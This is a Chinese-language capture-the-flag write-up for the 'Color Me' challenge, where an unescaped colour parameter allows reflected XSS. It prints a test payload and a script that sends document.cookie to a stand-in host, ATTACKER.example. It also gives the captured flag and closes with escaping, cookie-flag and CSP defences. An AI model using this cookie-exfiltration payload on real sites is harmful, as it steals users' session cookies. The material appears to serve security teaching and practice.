# Color Me

## 题目简述

colour 查询参数未经转义地插入 HTML 标题和内联 JavaScript 字符串，形成反射型 XSS。管理员机器人会访问用户上报的 URL，并在目标域设置 flag Cookie；构造脚本把 document.cookie 发到攻击者可控的接收端即可。

## 解题过程

模板中存在：

~~~html
<h1>USER_COLOUR</h1>
<script>
nospace = "USER_COLOUR".replace(" ", "");
</script>
~~~

最直观的验证是把 colour 设为：

~~~html
<script>alert(document.domain)</script>
~~~

确认执行后，替换为 Cookie 外传逻辑。使用 URL 编码后的完整目标，例如：

~~~html
<script>
fetch("https://ATTACKER.example/collect?c=" + encodeURIComponent(document.cookie))
</script>
~~~

先用自己的浏览器验证请求到达，再把同一挑战站点 URL 提交到 /report。管理员在挑战域上下文打开页面，脚本读取非 HttpOnly 的 flag Cookie 并发出请求，得到：

~~~text
maple{0ops_i_f0rgot_about_xss}
~~~

归档不保留比赛期 request catcher URL；关键 payload 和数据流已完整写在正文中。

## 方法总结

任何进入 HTML 文本、属性或 JavaScript 字符串的数据都必须按具体上下文转义。混用一个模板值到多个上下文尤其危险。防护应采用自动转义模板、避免内联脚本、设置 HttpOnly/SameSite Cookie，并用严格 CSP 作为纵深措施，而不是替代输出编码。
